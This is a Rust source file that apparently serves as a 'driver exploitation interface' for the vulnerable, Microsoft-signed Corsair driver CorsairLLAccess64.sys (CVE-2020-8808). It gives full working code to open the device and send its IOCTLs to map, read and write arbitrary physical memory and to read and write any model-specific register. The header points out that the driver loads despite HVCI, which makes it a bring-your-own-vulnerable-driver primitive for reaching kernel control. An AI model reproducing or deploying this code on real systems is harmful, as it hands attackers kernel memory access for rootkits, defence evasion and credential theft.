//! CorsairLLAccess64.sys Driver Backend
//!
//! Corsair iCUE Low-Level Access driver exploitation interface
//! Device: \\.\{ServiceName} (symlink derived from the installed service name)
//! CVE: CVE-2020-8808
//! Signing: WHQL (Microsoft Windows Hardware Compatibility Publisher)
//! HVCI: LoadsDespiteHVCI = TRUE
//! SHA-256: 01e024d3c76fb1b71851ab7761afbee23159d6e8cbf7f5f1d5052efca2f7756d
//!
//! Capabilities:
//! - Physical memory map to userspace (MmMapIoSpace + MmMapLockedPagesSpecifyCache)
//! - MSR read (any index)
//! - MSR write (any index, SEH wrapped)
//! - PCI bus config read/write (HalGet/SetBusDataByOffset)
//!
//! Access control: SeQueryInformationToken checks High integrity (Admin required)
//!
//! IOCTLs:
//!   0x225374 - Map physical memory (MmMapIoSpace)
//!   0x229378 - Unmap physical memory
//!   0x229384 - Write MSR
//!   0x225388 - Read MSR

use std::io;
use std::mem;
use std::ptr;

// =============================================================================
// Constants
// =============================================================================

const IOCTL_MAP_IO_SPACE: u32 = 0x225374;
const IOCTL_UNMAP_IO_SPACE: u32 = 0x229378;
const IOCTL_WRITE_MSR: u32 = 0x229384;
const IOCTL_READ_MSR: u32 = 0x225388;

// =============================================================================
// IOCTL Input/Output Structures
// =============================================================================

/// Input for IOCTL_MAP_IO_SPACE (0x225374)
/// Maps physical memory into the calling process's virtual address space.
/// Output: PVOID (8 bytes) — the mapped virtual address.
///
/// Driver expects C struct: { LARGE_INTEGER Base; ULONG Size; } = 12 bytes.
/// Must be packed to avoid trailing padding (repr(C) alone would pad to 16).
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
struct MapIoSpaceParams {
    /// Physical base address to map (PHYSICAL_ADDRESS / LARGE_INTEGER)
    base: u64,
    /// Number of bytes to map
    size: u32,
}

/// Input for IOCTL_WRITE_MSR (0x229384)
///
/// Driver expects C struct: { ULONG MsrIndex; ULONG_PTR Value; } = 12 bytes.
/// ULONG_PTR is 8 bytes on x64. Must be packed to avoid padding between
/// the u32 field and the u64 field (repr(C) alone inserts 4 bytes padding).
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
struct WriteMsrParams {
    /// MSR register index (ULONG)
    msr_index: u32,
    /// Value to write (ULONG_PTR)
    value: u64,
}

// =============================================================================
// Windows FFI
// =============================================================================

#[cfg(windows)]
mod ffi {
    use std::ffi::c_void;

    pub type HANDLE = *mut c_void;
    pub type DWORD = u32;
    pub type BOOL = i32;
    pub type LPCWSTR = *const u16;

    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
    pub const GENERIC_READ: DWORD = 0x80000000;
    pub const GENERIC_WRITE: DWORD = 0x40000000;
    pub const OPEN_EXISTING: DWORD = 3;
    pub const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;
    pub const FILE_SHARE_READ: DWORD = 1;
    pub const FILE_SHARE_WRITE: DWORD = 2;

    extern "system" {
        pub fn CreateFileW(
            lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD,
            lpSecurityAttributes: *mut c_void, dwCreationDisposition: DWORD,
            dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE,
        ) -> HANDLE;

        pub fn DeviceIoControl(
            hDevice: HANDLE, dwIoControlCode: DWORD,
            lpInBuffer: *const c_void, nInBufferSize: DWORD,
            lpOutBuffer: *mut c_void, nOutBufferSize: DWORD,
            lpBytesReturned: *mut DWORD, lpOverlapped: *mut c_void,
        ) -> BOOL;

        pub fn CloseHandle(hObject: HANDLE) -> BOOL;
        pub fn GetLastError() -> DWORD;
    }
}

// =============================================================================
// Driver Handle
// =============================================================================

#[cfg(windows)]
pub struct CorsairDriver {
    handle: ffi::HANDLE,
}

#[cfg(windows)]
impl CorsairDriver {
    /// Open a handle to the Corsair driver device.
    ///
    /// `service_name` is the installed service/driver name (e.g. "CorsairLLAccess64").
    /// The device path is derived as `\\.\{service_name}`.
    pub fn open(service_name: &str) -> io::Result<Self> {
        let device_path = format!(r"\\.\{}", service_name);
        let path: Vec<u16> = device_path.encode_utf16().chain(std::iter::once(0)).collect();
        let handle = unsafe {
            ffi::CreateFileW(
                path.as_ptr(),
                ffi::GENERIC_READ | ffi::GENERIC_WRITE,
                ffi::FILE_SHARE_READ | ffi::FILE_SHARE_WRITE,
                ptr::null_mut(),
                ffi::OPEN_EXISTING,
                ffi::FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            )
        };
        if handle == ffi::INVALID_HANDLE_VALUE {
            return Err(io::Error::last_os_error());
        }
        Ok(Self { handle })
    }

    /// Map physical memory into userspace. Returns mapped virtual address.
    pub fn map_physical(&self, phys_addr: u64, size: u32) -> io::Result<u64> {
        let params = MapIoSpaceParams { base: phys_addr, size };
        let mut mapped_va: u64 = 0;
        let mut returned: u32 = 0;

        let ok = unsafe {
            ffi::DeviceIoControl(
                self.handle, IOCTL_MAP_IO_SPACE,
                &params as *const _ as *const _, mem::size_of::<MapIoSpaceParams>() as u32,
                &mut mapped_va as *mut _ as *mut _, 8,
                &mut returned, ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(io::Error::last_os_error());
        }
        Ok(mapped_va)
    }

    /// Unmap previously mapped physical memory.
    pub fn unmap_physical(&self, mapped_va: u64) -> io::Result<()> {
        let mut returned: u32 = 0;
        let ok = unsafe {
            ffi::DeviceIoControl(
                self.handle, IOCTL_UNMAP_IO_SPACE,
                &mapped_va as *const _ as *const _, 8,
                ptr::null_mut(), 0,
                &mut returned, ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(io::Error::last_os_error());
        }
        Ok(())
    }

    /// Read a Model-Specific Register by index.
    pub fn read_msr(&self, msr_index: u32) -> io::Result<u64> {
        let input: u64 = msr_index as u64;
        let mut output: u64 = 0;
        let mut returned: u32 = 0;

        let ok = unsafe {
            ffi::DeviceIoControl(
                self.handle, IOCTL_READ_MSR,
                &input as *const _ as *const _, 8,
                &mut output as *mut _ as *mut _, 8,
                &mut returned, ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(io::Error::last_os_error());
        }
        Ok(output)
    }

    /// Write a value to a Model-Specific Register.
    pub fn write_msr(&self, msr_index: u32, value: u64) -> io::Result<()> {
        let params = WriteMsrParams { msr_index, value };
        let mut returned: u32 = 0;

        let ok = unsafe {
            ffi::DeviceIoControl(
                self.handle, IOCTL_WRITE_MSR,
                &params as *const _ as *const _, mem::size_of::<WriteMsrParams>() as u32,
                ptr::null_mut(), 0,
                &mut returned, ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(io::Error::last_os_error());
        }
        Ok(())
    }

    /// Read physical memory by mapping, copying, and unmapping.
    /// This is the safe high-level API that handles the map/read/unmap cycle.
    pub fn read_physical_memory(&self, phys_addr: u64, size: usize) -> io::Result<Vec<u8>> {
        let mapped_va = self.map_physical(phys_addr, size as u32)?;
        let mut buffer = vec![0u8; size];
        unsafe {
            ptr::copy_nonoverlapping(mapped_va as *const u8, buffer.as_mut_ptr(), size);
        }
        self.unmap_physical(mapped_va)?;
        Ok(buffer)
    }

    /// Read a u64 from physical memory.
    pub fn read_physical_u64(&self, phys_addr: u64) -> io::Result<u64> {
        let data = self.read_physical_memory(phys_addr, 8)?;
        Ok(u64::from_le_bytes(data[..8].try_into().unwrap()))
    }

    /// Read a u32 from physical memory.
    pub fn read_physical_u32(&self, phys_addr: u64) -> io::Result<u32> {
        let data = self.read_physical_memory(phys_addr, 4)?;
        Ok(u32::from_le_bytes(data[..4].try_into().unwrap()))
    }

    /// Write data to physical memory by mapping, writing, and unmapping.
    pub fn write_physical_memory(&self, phys_addr: u64, data: &[u8]) -> io::Result<()> {
        let mapped_va = self.map_physical(phys_addr, data.len() as u32)?;
        unsafe {
            ptr::copy_nonoverlapping(data.as_ptr(), mapped_va as *mut u8, data.len());
        }
        self.unmap_physical(mapped_va)?;
        Ok(())
    }
}

#[cfg(windows)]
impl Drop for CorsairDriver {
    fn drop(&mut self) {
        unsafe { ffi::CloseHandle(self.handle); }
    }
}

// =============================================================================
// Non-Windows stub
// =============================================================================

#[cfg(not(windows))]
pub struct CorsairDriver;

#[cfg(not(windows))]
impl CorsairDriver {
    pub fn open(_service_name: &str) -> io::Result<Self> { Err(io::Error::new(io::ErrorKind::Unsupported, "windows only")) }
    pub fn map_physical(&self, _: u64, _: u32) -> io::Result<u64> { unimplemented!() }
    pub fn unmap_physical(&self, _: u64) -> io::Result<()> { unimplemented!() }
    pub fn read_msr(&self, _: u32) -> io::Result<u64> { unimplemented!() }
    pub fn write_msr(&self, _: u32, _: u64) -> io::Result<()> { unimplemented!() }
    pub fn read_physical_memory(&self, _: u64, _: usize) -> io::Result<Vec<u8>> { unimplemented!() }
    pub fn read_physical_u64(&self, _: u64) -> io::Result<u64> { unimplemented!() }
    pub fn read_physical_u32(&self, _: u64) -> io::Result<u32> { unimplemented!() }
    pub fn write_physical_memory(&self, _: u64, _: &[u8]) -> io::Result<()> { unimplemented!() }
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ioctl_codes_valid() {
        // Verify IOCTL codes decode correctly per CTL_CODE macro
        // CTL_CODE(DeviceType, Function, Method, Access)
        // 0x225374: DevType=0x22, Function=0x4DD, Method=0, Access=1 (FILE_READ_ACCESS)
        assert_eq!(IOCTL_MAP_IO_SPACE, 0x225374);
        assert_eq!(IOCTL_UNMAP_IO_SPACE, 0x229378);
        assert_eq!(IOCTL_WRITE_MSR, 0x229384);
        assert_eq!(IOCTL_READ_MSR, 0x225388);
    }

    #[test]
    fn struct_sizes() {
        assert_eq!(mem::size_of::<MapIoSpaceParams>(), 12);
        assert_eq!(mem::size_of::<WriteMsrParams>(), 12);
    }
}
